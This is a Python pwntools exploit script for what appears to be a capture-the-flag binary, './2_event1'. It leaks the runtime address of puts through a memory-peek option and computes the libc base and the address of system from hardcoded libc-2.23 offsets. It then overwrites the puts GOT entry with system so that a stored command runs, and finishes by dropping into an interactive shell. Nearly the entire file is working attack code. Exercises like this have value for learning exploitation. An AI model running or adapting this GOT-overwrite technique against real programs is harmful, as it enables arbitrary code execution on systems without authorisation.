#!/usr/bin/python 

from pwn import *
from os import *

time = 0.2

# Executes the program
p = process("./2_event1")

def main():

	# Command to be executed
	cmd = "ed"	
	cmd = cmd.ljust(98, "\x00")

	skip_option() # Skips name
	send_name(cmd) # Stores /bin/sh in the stack

	# For GDB purposes
	raw_input(str(p.proc.pid))	

	log.info("Stored " + cmd + " in the stack")

	skip_option() # Skips option
	select_peek_memory_addr()		

	'''
	readelf -r ./2_event1| grep puts
	0804a020  00000607 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
	'''
	puts_GOT = 0x0804a020 # puts GOT address
	send_hex_address(puts_GOT) # Sends puts GOT address to retrieve the real address of puts

	data = "" # Declares variable first to prevent errors
	data = skip_option_and_return_data(data) # Data contains the real address of puts
		
	libc_base_addr = 0x0 # Declares variable first to prevent errors
	libc_base_addr = get_libc_base_addr(data, libc_base_addr) # Gets the base address of libc

	'''
        objdump -d /lib/i386-linux-gnu/libc-2.23.so | grep "<__libc_system@@GLIBC_PRIVATE>"
        0003ada0 <__libc_system@@GLIBC_PRIVATE>:
	'''
	system_offset = 0x0003ada0
	system_addr = libc_base_addr + system_offset # Calculate the real address of system
	log.info("Calculated system address -> 0x%x" %system_addr)

	select_overwrite_memory_addr() # Selects option 3
	send_hex_address(puts_GOT) # Sends the addres to be overwritten
	send_hex_address(system_addr) # To be overwritten with system_addr
	log.info("Overwrote puts GOT address with system address")
	skip_option() # Skips option after doing the system_addr overwrite
	log.info("Executing " + cmd)
	
	# Pass interaction back to user
	p.sendline("echo $SHELL; id") # Additional info
	p.interactive()

def skip_option():
	p.recvrepeat(time)

def skip_option_and_return_data(data):
	data = p.recvrepeat(time)
	return data

def select_name():
	p.sendline("2")
	
def send_name(name):
	p.sendline(name)

def select_peek_memory_addr():
	p.sendline("1")

def select_overwrite_memory_addr():
	p.sendline("3")

def send_hex_address(addr):
	p.sendline(hex(addr))


def get_libc_base_addr(data, libc_base_addr):
	puts_addr = ""

	for i in data.split("\n"):
		if "Contents:" in i:
			# Finds only hex address
			puts_addr = i[ i.find("0x") : len(i) ] 	

			# Converts type from string to hex
			puts_addr = int(puts_addr, 16)

	# Informs user on puts address	
	log.info("Retrieved puts address -> 0x%x " %puts_addr)	

	'''
	Offset puts:

        objdump -d /lib/i386-linux-gnu/libc-2.23.so | grep "<_IO_puts@@GLIBC_2.0>"
        --> 0005fca0 <_IO_puts@@GLIBC_2.0>:
	'''
	puts_offset = 0x0005fca0
	libc_base_addr = puts_addr - puts_offset 

	# Informs user on libc base address
	log.info("Calculated libc base address -> 0x%x" %libc_base_addr)
	
	return libc_base_addr

if __name__ == "__main__": 
	main()
